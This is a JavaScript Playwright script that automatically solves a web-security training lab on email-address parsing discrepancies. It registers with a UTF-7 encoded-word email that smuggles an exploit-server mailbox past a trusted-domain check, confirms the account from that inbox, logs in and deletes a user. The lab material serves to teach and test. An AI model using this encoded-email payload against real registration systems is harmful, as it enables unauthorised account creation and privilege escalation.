const { deleteCarlos, runLab } = require('./_common.cjs');

const TITLE = 'Bypassing access controls using email address parsing discrepancies';
const PATH = '/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies';

function randomSuffix() {
  return Math.random().toString(36).slice(2, 8);
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
    const emailClientUrl = await page.locator('#exploit-link').getAttribute('href');
    const exploitHost = new URL(emailClientUrl).hostname;
    const username = `attacker_${randomSuffix()}`;
    const mailbox = `attacker${randomSuffix()}`;
    const password = 'Password123!';
    const email = `=?utf-7?q?${mailbox}&AEA-${exploitHost}&ACA-?=@ginandjuice.shop`;
    const beforeInbox = await page.request.get(emailClientUrl).then((response) => response.text());
    const beforeTokens = new Set([...beforeInbox.matchAll(/temp-registration-token=([^"'\s<]+)/gi)].map((match) => match[1]));

    await page.goto(labUrl + '/register', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.fill('input[name="username"]', username);
    await page.fill('input[name="email"]', email);
    await page.fill('input[name="password"]', password);
    await page.fill('input[name="confirm-password"], input[name="password-confirm"]', password).catch(() => {});
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('button[type="submit"], input[type="submit"]'),
    ]);

    let confirmationUrl = '';
    for (let attempt = 0; attempt < 8 && !confirmationUrl; attempt += 1) {
      // eslint-disable-next-line no-await-in-loop
      await page.waitForTimeout(1000);
      // eslint-disable-next-line no-await-in-loop
      const emailPage = await page.request.get(emailClientUrl).then((response) => response.text());
      confirmationUrl = [...emailPage.matchAll(/https:\/\/[^"'\s<]+temp-registration-token=([^"'\s<]+)/gi)]
        .find((match) => !beforeTokens.has(match[1]))?.[0] || '';
    }
    if (!confirmationUrl) {
      throw new Error('Registration confirmation URL not found in email client');
    }
    await page.goto(confirmationUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });

    await page.goto(labUrl + '/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await page.fill('input[name="username"]', username);
    await page.fill('input[name="password"]', password);
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('button[type="submit"], input[type="submit"]'),
    ]);

    await deleteCarlos(page, labUrl);
  },
});
